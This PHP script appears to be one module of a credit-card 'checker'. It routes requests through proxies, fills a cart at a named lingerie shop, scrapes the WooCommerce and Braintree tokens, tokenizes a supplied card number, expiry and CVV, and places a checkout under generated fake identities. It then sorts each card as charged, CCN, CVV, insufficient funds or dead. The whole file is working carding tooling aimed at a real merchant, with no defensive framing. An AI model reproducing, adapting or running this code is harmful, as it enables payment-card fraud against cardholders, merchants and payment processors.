<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$data = 'attribute_pa_color=black&quantity=1&add-to-cart=16775&product_id=16775&variation_id=16778';

$r1 = $this->curlx->Post('https://kissme-lingerie.com/shop/accessories/scarves/2-piece-knit-hat-gloves-set/', $data, null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$headers = [
	'Authority: kissme-lingerie.com',
	'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'Accept-Language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	"Sec-Ch-Ua: \"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"",
	'Sec-Ch-Ua-Mobile: ?1',
	"Sec-Ch-Ua-Platform: \"Android\"",
	'Sec-Fetch-Dest: document',
	'Sec-Fetch-Mode: navigate',
	'Sec-Fetch-Site: none',
	'Sec-Fetch-User: ?1',
	'Upgrade-Insecure-Requests: 1',
	'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36'
];

$r2 = $this->curlx->Get('https://kissme-lingerie.com/checkout/', $headers, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$_wpnonce_v1 = trim(strip_tags($this->getstr($r2->body, '_wpnonce" value="', '"')));

$client_token_nonce = trim(strip_tags($this->getstr($r2->body, 'credit_card","client_token_nonce":"', '"')));

$update_order_review_nonce = trim(strip_tags($this->getstr($r2->body, 'update_order_review_nonce":"', '"')));

if (empty($_wpnonce_v1) || empty($client_token_nonce) || empty($update_order_review_nonce)) {
	$empty = 'Second Request Tokens is Empty';

	goto start;
}

$data = 'security='.$update_order_review_nonce.'&payment_method=braintree_credit_card&country=US&state=NY&postcode=10509&city=Brewster&address=12+main+street&address_2=&s_country=US&s_state=NY&s_postcode=10509&s_city=Brewster&s_address=12+main+street&s_address_2=&has_full_address=true&post_data=billing_first_name%3D'.$fake->first.'%26billing_last_name%3D'.$fake->last.'%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D12%2520main%2520street%26billing_address_2%3D%26billing_city%3DBrewster%26billing_state%3DNY%26billing_postcode%3D10509%26billing_phone%3D2564567654%26billing_email%3D'.urlencode(urlencode($fake->email)).'%26kco_shipping_data%3Dfalse%26account_password%3D%26ship_to_different_address%3D1%26shipping_first_name%3D'.$fake->first.'%26shipping_last_name%3D'.$fake->last.'%26shipping_company%3D%26shipping_country%3DUS%26shipping_address_1%3D12%2520main%2520street%26shipping_address_2%3D%26shipping_city%3DBrewster%26shipping_state%3DNY%26shipping_postcode%3D10509%26shipping_phone%3D2564567654%26order_comments%3D%26shipping_method%255B0%255D%3Dlegacy-shipping_by_rules1375%26payment_method%3Dbraintree_credit_card%26wc-braintree-credit-card-card-type%3D%26wc-braintree-credit-card-3d-secure-enabled%3D%26wc-braintree-credit-card-3d-secure-verified%3D%26wc-braintree-credit-card-3d-secure-order-total%3D47.85%26wc_braintree_credit_card_payment_nonce%3D%26wc_braintree_device_data%3D%26wc_braintree_paypal_payment_nonce%3D%26wc_braintree_device_data%3D%26wc_braintree_paypal_amount%3D47.85%26wc_braintree_paypal_currency%3DUSD%26wc_braintree_paypal_locale%3Den_us%26mailpoet_woocommerce_checkout_optin_present%3D1%26_wpnonce%3D'.$_wpnonce_v1.'%26_wp_http_referer%3D%252Fcheckout%252F&shipping_method%5B0%5D=legacy-shipping_by_rules1375';

$headers = [
	'Authority: kissme-lingerie.com',
	'Accept: */*',
	'Accept-Language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
	'Origin: https://kissme-lingerie.com',
	'Referer: https://kissme-lingerie.com/checkout/',
	"Sec-Ch-Ua: \"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"",
	'Sec-Ch-Ua-Mobile: ?1',
	"Sec-Ch-Ua-Platform: \"Android\"",
	'Sec-Fetch-Dest: empty',
	'Sec-Fetch-Mode: cors',
	'Sec-Fetch-Site: same-origin',
	'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
	'X-Requested-With: XMLHttpRequest'
];

$r3 = $this->curlx->Post('https://kissme-lingerie.com/?wc-ajax=update_order_review', $data, $headers, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$_wpnonce_v2 = trim(strip_tags($this->getstr($r3->body, '_wpnonce\" value=\"', '\"')));

if (empty($_wpnonce_v2)) {
	$empty = 'Third Request Token is Empty';

	goto start;
}

$data = 'action=wc_braintree_credit_card_get_client_token&nonce='.$client_token_nonce.'';

$headers = [
	'Authority: kissme-lingerie.com',
	'Accept: */*',
	'Accept-Language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
	'Origin: https://kissme-lingerie.com',
	'Referer: https://kissme-lingerie.com/checkout/',
	'Sec-Ch-Ua: \"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"',
	'Sec-Ch-Ua-Mobile: ?1',
	'Sec-Ch-Ua-Platform: \"Android\"',
	'Sec-Fetch-Dest: empty',
	'Sec-Fetch-Mode: cors',
	'Sec-Fetch-Site: same-origin',
	'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
	'X-Requested-With: XMLHttpRequest'
];

$r4 = $this->curlx->Post('https://kissme-lingerie.com/wp-admin/admin-ajax.php', $data, $headers, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$authorization = trim(strip_tags($this->getstr($r4->body, 'data":"', '"')));

if (empty($authorization)) {
	$empty = 'Fourth Request Token is Empty';

	goto start;
}

$b3_data = json_decode(base64_decode($authorization));

if (!isset($b3_data->authorizationFingerprint, $b3_data->merchantId)) {
	$empty = 'Third Request Tokens is Empty';

	goto start;
}

$authorizationFingerprint = $b3_data->authorizationFingerprint;

$sessionId = substr($fake->guid, 0, -6);

$data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$sessionId.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yyyy.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}';

$headers = [
	"authorization: Bearer $authorizationFingerprint",
	'braintree-version: 2018-05-10',
	'content-type: application/json'
];

$r5 = $this->curlx->Post('https://payments.braintree-api.com/graphql', $data, $headers, $cookie, $server['proxy']);

if (!$r5->success) goto start;

$token = $this->getstr($r5->body, 'token":"', '"');

if (empty($token)) {
	$empty = 'Fifth Request Token is Empty';

	goto start;
}

$correlation_id = $this->tools->GenPass(32);

$cc_type = ([
	'3' => 'american-express',
	'4' => 'visa',
	'5' => 'master-card',
	'6' => 'discover'
])[substr($cc, 0, 1)];

$data = 'billing_first_name='.$fake->first.'&billing_last_name='.$fake->last.'&billing_company=&billing_country=US&billing_address_1=12+main+street&billing_address_2=&billing_city=Brewster&billing_state=NY&billing_postcode=10509&billing_phone=2564567654&billing_email='.urlencode($fake->email).'&kco_shipping_data=false&account_password=&ship_to_different_address=1&shipping_first_name='.$fake->first.'&shipping_last_name='.$fake->last.'&shipping_company=&shipping_country=US&shipping_address_1=12+main+street&shipping_address_2=&shipping_city=Brewster&shipping_state=NY&shipping_postcode=10509&shipping_phone=2564567654&order_comments=&shipping_method%5B0%5D=legacy-shipping_by_rules1375&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type='.$cc_type.'&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=0&wc-braintree-credit-card-3d-secure-order-total=27.90&wc_braintree_credit_card_payment_nonce='.$token.'&wc_braintree_device_data=%7B%22correlation_id%22%3A%22'.$correlation_id.'%22%7D&wc_braintree_paypal_payment_nonce=&wc_braintree_device_data=%7B%22correlation_id%22%3A%22'.$correlation_id.'%22%7D&wc_braintree_paypal_amount=27.90&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&mailpoet_woocommerce_checkout_optin_present=1&_wpnonce='.$_wpnonce_v2.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review';

$headers = [
	'Authority: kissme-lingerie.com',
	'Accept: application/json, text/javascript, */*; q=0.01',
	'Accept-Language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
	'Origin: https://kissme-lingerie.com',
	'Referer: https://kissme-lingerie.com/checkout/',
	'Sec-Ch-Ua: \"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"',
	'Sec-Ch-Ua-Mobile: ?1',
	'Sec-Ch-Ua-Platform: \"Android\"',
	'Sec-Fetch-Dest: empty',
	'Sec-Fetch-Mode: cors',
	'Sec-Fetch-Site: same-origin',
	'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
	'X-Requested-With: XMLHttpRequest'
];

$r6 = $this->curlx->Post('https://kissme-lingerie.com/?wc-ajax=checkout', $data, $headers, $cookie, $server['proxy']);

if (!$r6->success) goto start;

$json_r6 = json_decode($r6->body);

if (isset($json_r6->result) && $json_r6->result == 'success') {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CHARGED - Result -> Success!"];

	goto end;
}

$err = trim(strip_tags($this->getstr($r6->body, '<li>\n\t\t\t', '\t')));

$msg = empty($err) ? trim(strip_tags($json_r6->messages ?? '')) : $err;

$msg = str_replace(', please use an alternate card or other form of payment.', '', $msg);

$status = ['status' => 'APPROVED', 'emoji' => '✅'];

if (strpos($msg, 'card verification number does not match') !== false || strpos(strtolower($msg), 'cvv')) {
	$status['msg'] = "CCN CARD - $msg";
} elseif (strpos($msg, 'does not match') || strpos(strtolower($msg), 'avs')) {
	$status['msg'] = "CVV CARD - AVS FAILED -> $msg";
} elseif (strpos(strtolower($msg), 'insufficient funds') !== false) {
	$status['msg'] = "CVV CARD - Insufficient Funds -> $msg";
} else {
	$status = ['status' => 'DECLINED', 'emoji' => '❌', 'msg' => 'DEAD - '.(empty($msg) ? 'Unknown Error' : $msg).'!'];
}

end: